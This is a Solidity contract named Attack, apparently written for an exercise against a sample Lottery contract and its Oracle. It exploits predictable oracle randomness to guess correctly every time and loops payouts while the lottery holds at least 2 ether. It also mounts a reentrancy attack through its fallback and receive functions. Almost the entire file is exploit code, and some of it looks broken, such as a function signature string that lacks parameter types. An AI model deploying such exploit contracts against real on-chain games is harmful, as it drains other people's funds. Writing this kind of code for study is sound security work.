// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.6.0;
pragma experimental ABIEncoderV2;

/// @title Lottery Game with interface to Oracle

import "./Lottery.sol";
import "./Oracle.sol";

contract Attack {

    Lottery public eg;
    Oracle public ek;
    address private winner;
    uint counter;

    constructor(address _oracle, address _lottery) public {
        eg = Lottery(payable(_lottery));
        ek = Oracle(_oracle);
    }

    function registerLottery(address _address) public payable {
        require(msg.value == 1_000_000_000);
        winner = _address;
        eg.registerTeam.value(msg.value)(_address, "Attack Contract", "");
    }

    //Makes the correct guess every time, gets 2 gwei payout
    function standardPayout() public {
        eg.makeAGuess(winner, ek.getRandomNumber());
        eg.payoutWinningTeam(winner);
    }

    function chainPayout() public {
        uint256 temp = ek.getRandomNumber();
        address temp2 = winner;
        uint counter2;

        for(counter2 = 0; address(eg).balance >= 2 ether; counter2++) {
            eg.makeAGuess(temp2, temp);
            eg.payoutWinningTeam(temp2);
        }
        counter = counter2;
    }

    function reentrancyAttack() public {
        (, bytes memory temp) = address(eg).call(abi.encodeWithSignature
        ("payoutWinningTeam", winner));
        eg.payoutWinningTeam(bytesToAddress(temp));
    }

    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
        addr := mload(add(bys,20))
        } 
    }

    fallback() external payable {
        eg.payoutWinningTeam(winner);
    }

    receive() external payable {
        if(gasleft() > 40_000) {
            eg.payoutWinningTeam(winner);
        }
    }
}